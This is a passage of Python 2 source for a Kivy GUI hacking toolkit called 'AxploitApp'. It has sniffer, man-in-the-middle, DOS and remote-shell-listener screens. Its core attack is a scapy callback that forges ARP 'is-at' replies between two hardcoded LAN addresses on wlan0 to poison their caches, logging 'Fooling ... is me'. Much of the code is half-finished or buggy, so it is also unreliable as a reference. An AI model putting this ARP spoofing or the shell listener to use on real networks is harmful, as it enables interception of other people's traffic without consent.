      #   self.ids.commands.text='\ncommand executed succefuly ! '
      #wait for more connections 
      #input=raw_input("")
      #input+="\n"
      #client.send(input)
    except Exception, e:
      print e
        

  def server_listen(self, port_number):
  
    target_host=socket.gethostbyaddr('localhost')[2][0]
    self.listener=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.listener.bind(('', port_number))
    self.listener.listen(125)
    while True:
      if self.stop_rse_server==True:
        return 0
      self.client,addr=self.listener.accept()
      self.ids.serve.text="Incomming connection from  %s: %d" %(addr[0], addr[1])  
      clients [addr[0]]=self.client
      #client_serve_thread=threading.Thread(target=self.client_serve, args=(client, ))
      #client_serve_thread.start()
  def call_server(self, port_number):
    try:
      port_number=int(port_number)
    except Exception, e:
      print e
      self.warning('please enter the port number to listen on')
      return 0
    self.start_server_thread=threading.Thread(target=self.server_listen, args=(port_number,))
    self.start_server_thread.start()
    self.ids.serve.text="Server is listening on port "+ str(port_number)+"..."

class mitm_tabs(TabbedPanel):
    pass

class tabs(TabbedPanel):
    pass
    #tp.add_widget(th)    # tb_panel=TabbedPanel()
    # th_text_head=TabbedPanelHeader(text='Text tab')
    # th_text_head.content=Label(text='coolt')
    # tb_panel.add_widget(th_text_head)

class HelpScreen(Screen):
    def __init__(self, *args, **kwargs):
        super(Screen, self).__init__()
        self.name='Help'
  

class AxploitApp(App): 
    def __init__(self):
        
        App.__init__(self)
        
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MenuScreen(name='Menu'))
        sm.add_widget(SettingsScreen(name='Settings'))
        sm.add_widget(SnifferScreen(name='Sniffer'))
        sm.add_widget(MitmScreen(name='Mitm'))
        sm.add_widget(DosScreen(name='DOS'))
        sm.add_widget(RseScreen(name='RSE'))
        sm.add_widget(HelpScreen(name='Help'))

        return sm #MainWindow()
    



class SaveDialog(FloatLayout):

    save_file = ObjectProperty(None)
    cancel  = ObjectProperty(None)

class MainWindow(BoxLayout):
    _sniffer_screen=ObjectProperty()


    #scan_results = ObjectProperty(None) 
    
    Color(0.7,0.5,0.4)
    """open_button = ObjectProperty()
    save_button = ObjectProperty()
    save_as_button = ObjectProperty()
    cut_button = ObjectProperty()
    copy_button = ObjectProperty()
    paste_button = ObjectProperty()
    delete_button = ObjectProperty()
    text_view = ObjectProperty()"""

    def __init__(self, **kwargs):

        super(MainWindow, self).__init__()
        self.clipboard_text = ""
        self.filepath = ""    
    def open_file(self,path,filename):
        self.filepath = filename[0]
        f = open(self.filepath,'r')
        s = f.read()
        self.text_view.text = s
        f.close()
        self.cancel_dialog()
        
    def cancel_dialog(self):
        self._popup.dismiss()

    def get_sniffer_screen(self, *args):
        self._sniffer_screen=Sniffer_screen()
        self._sniffer_screen.open()
        
    def Sniffer(self, *args):
        content = self.sniff_window()
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()
            
    def DOS(self, *args):
        content = Label(text = "Kg")
        self._popup = Popup(title="Dos",content=content,
                            size_hint=(0.9,0.9))
        self._popup.open()

    def save_as_file(self, path,filename):
        content = Label(text = "Man In the Middle Attacks")
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()
        
    def on_copy(self, *args):
        return 0


    def DNS(self, *args):
        content = Label(text = "DNS")
        self._popup = Popup(title="Dos",content=content,size_hint=(0.9,0.9))
        self._popup.open()

    def Mitm(self, *args):
        content = self.Mitm_window()
        self._popup = Popup(title="Mitm",content=content,size_hint=(0.9,0.9))
        self._popup.open()
    def Help(self, *args):
        content = Label(text = "Please enter the target Host")
        self._popup = Popup(title="Warning !",content=content,size_hint=(0.9,0.9))
      



        self._popup.open()
    def sniff_window(self):
        b=BoxLayout()
        b.add_widget(Label(text='Enter the Interface', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        b.add_widget(TextInput(multiline=False, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        return b
    def Mitm_window(self):
        self.b=BoxLayout()
        self.b.add_widget(Label(text='Enter the Interface', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        self.b.add_widget(TextInput(multiline=False, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        btn1=Button(text='Start', pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1))
        btn1.bind(on_release=lambda x:self.arp_spoof('intface'))
        self.b.add_widget(btn1)
        return self.b

    #self.scan_results.text="{}".format(self.scan_results.text + str(i))  
    def arp_poison_callback(self, packet):
        b=BoxLayout()
        global router_ip
        # Got ARP request?
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        #print (packet[ARP].pdst + "\n"+ "src is " + packet[ARP].psrc + "\n")
    
        if packet[ARP].op == 1 and str(packet[ARP].psrc)==str('192.168.100.5') and str(packet[ARP].pdst)=='192.168.100.1':
            answer = Ether(dst=packet[ARP].hwsrc) / ARP()
            answer[ARP].op = "is-at"
            answer[ARP].hwdst = packet[ARP].hwsrc
            answer[ARP].psrc = packet[ARP].pdst
            answer[ARP].pdst = packet[ARP].psrc
            router_ip=packet[ARP].pdst
            txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
            print txt1
            #b.add_widget(Label(text=txt1, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
            sendp(answer, iface='wlan0')
        
        if packet[ARP].op == 1 and (router_ip):
            if(str(packet[ARP].psrc) ==router_ip and str(packet[ARP].pdst)==str('192.168.100.5')):          
                device_b = Ether(dst=packet[ARP].hwsrc) / ARP()
                device_b[ARP].op = "is-at"
                device_b[ARP].hwdst = packet[ARP].hwsrc
                device_b[ARP].psrc = packet[ARP].pdst
                device_b[ARP].pdst = packet[ARP].psrc
                txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
                print txt2
                #b.add_widget(Label(text=txt2, pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
                sendp(device_b, iface='wlan0')  

        return b
    def arp_spoof(self, intf):
        
        sniff(count=20, prn=arp_poison_callback,filter="arp",iface='wlan0',store=0)
        b=BoxLayout()
        #txt2="Now Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
        #txt1="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
        b.add_widget(Label(text="txt1", pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        b.add_widget(Label(text="txt2", pos_hint= {'x': .1,'top': .2},size_hint = (.1,.1)))
        return b
class ComboEdit(TextInput):

    options = ListProperty(('', ))

    def __init__(self, **kw):
        ddn = self.drop_down = DropDown()
        ddn.bind(on_select=self.on_select)
        super(ComboEdit, self).__init__(**kw)

    def on_options(self, instance, value):
        ddn = self.drop_down
        ddn.clear_widgets()
        for widg in value:
            widg.bind(on_release=lambda btn: ddn.select(btn.text))
            ddn.add_widget(widg)

    def on_select(self, *args):
        self.text = args[1]


    def on_touch_up(self, touch):
        if touch.grab_current == self:
            self.drop_down.open(self)
        return super(ComboEdit, self).on_touch_up(touch)

class Nmap_output(TabbedPanel):
    pass

class Sniffer_screen(ModalView):
    pass

    
    #xhint=NumericProperty(.15)
    #yhint = NumericProperty(.15)

    #switching_to_mainmenu1 = ObjectProperty()





if __name__ == '__main__':
    
    AxploitApp().run()



"""
            ComboEdit:
                size_hint:(None, None)
                width:180
                height:30
                pos_hint:{'top':.8}
                text:'Choose a scan type'
                options:
                    [Button(text = str(app.scan_types[x]),size_hint_y=None,height=30)for x in range(len(app.scan_types))]


"""

"""

        BoxLayout:  
            pos_hint:{'top':1}              
            RstDocument:
                id:scan_results
                text:''
                canvas:
                    Rectangle:
                        
                        size: 100, 400  
"""

            